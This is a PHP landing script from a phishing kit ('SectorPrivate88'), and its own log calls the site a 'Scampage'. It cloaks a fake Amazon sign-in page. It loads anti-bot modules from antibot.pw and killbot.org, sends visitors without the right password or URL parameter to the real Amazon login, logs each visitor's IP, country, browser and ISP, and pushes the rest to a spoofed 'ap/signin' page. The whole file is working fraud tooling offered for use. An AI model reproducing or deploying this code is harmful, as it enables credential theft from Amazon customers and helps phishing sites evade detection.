<?php
/*
____            _             ____       _            _           ___   ___  
/ ___|  ___  ___| |_ ___  _ __|  _ \ _ __(_)_   ____ _| |_ ___    ( _ ) ( _ ) 
\___ \ / _ \/ __| __/ _ \| '__| |_) | '__| \ \ / / _` | __/ _ \   / _ \ / _ \ 
 ___) |  __/ (__| || (_) | |  |  __/| |  | |\ V / (_| | ||  __/  | (_) | (_) |
|____/ \___|\___|\__\___/|_|  |_|   |_|  |_| \_/ \__,_|\__\___|___\___/ \___/ 
                                                             |_____|          

Join our community
Facebook Groups : https://www.facebook.com/groups/621105481775437/
Telegram Chanel : https://t.me/sectorprivate88
Need our help : sectorprivate88 [at] gmail.com

if link die you can find at (https://pastebin.com/2bwFRSjP) for updated link

*/
error_reporting(0);
session_start();
ini_set("memory_limit","-1");
function checkcurl(){
    return function_exists('curl_version');
}
$check = checkcurl();
if($check == "0") {
    echo "Curl belum terinstall, mohon install php curl terlebih dahulu.";
    exit();
}
require_once("main.php");
require_once("crawlerdetect.php");
require_once("blocker.php");
if($setting['block_referrer'] == "on") {
require_once("crawlerdetect.php");
}

if(filesize("antibot.ini") == 1) {
}else{
    $ch = curl_init("https://antibot.pw");
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
    $output = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if($httpcode == "0") {
    }else{
        require_once("antibot.php");
    }
}
if(filesize("killbot.ini") == 1) {
}else{
    $ch = curl_init("https://killbot.org");
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
    $output = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if($httpcode == "0") {
    }else{
        require_once("killbot.php");
    }
}
require_once("lang.php");
if($setting['block_iprange'] == "on") {
  require_once("blacklist.php");
}
if($setting['onetime'] == "on") {
  require_once("onetime.php");
}
if($setting['site_pass_on'] == "on") {
    $secret = md5($ip);
    $password = $_POST[$secret];
    $mypass = md5($setting['site_password']);
    if(!isset($password)) {
        tulis_file("result/log_visitor.txt","[$time - $ip - $countryname - $br - $os] Gagal Masuk Site Password");
        tulis_file("block_bot.txt","BLOCKED SITE PASSWORD || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        tulis_file("result/total_bot.txt","$ip|Wrong Site Password");
//        header("location: https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24");
header("location: https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");  
      exit();
/*}else if($password != $mypass) {
tulis_file("result/log_visitor.txt","[$time - $ip - $countryname - $br - $os] Gagal Masuk Site Password");
        tulis_file("block_bot.txt","BLOCKED SITE PASSWORD || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-$
        tulis_file("result/total_bot.txt","$ip (Site Password)");
        header("location: https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGX$
        exit();*/
    }else{
        $_SESSION['key'] = $key;
    }
}

if($setting['site_param_on'] == "on") {
    $secret = $setting['site_parameter'];
    $password = $_GET[$secret];
    if(!isset($password)) {
        tulis_file("result/log_visitor.txt","[$time - $ip - $countryname - $br - $os] Gagal Masuk Site Parameter");
        tulis_file("block_bot.txt","BLOCKED SITE PARAM || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        tulis_file("result/total_bot.txt","$ip|Wrong Site Parameter");
        header('HTTP/1.0 403 Forbidden');
header("location: https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");        
//header("location: https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24");
        exit();
    }else{
        $_SESSION['key'] = $key;
    }
}
$isps = getisp($ip2);
tulis_file("result/log_visitor.txt","[$time - $ip - $countryname - $br - $os] Mengunjungi Scampage");
tulis_file("result/total_click.txt","$ip|$countrycode|$countryname|$br|$os|$isps");
echo "<script type='text/javascript'>window.top.location='ap/signin?session=".$key."';</script>";
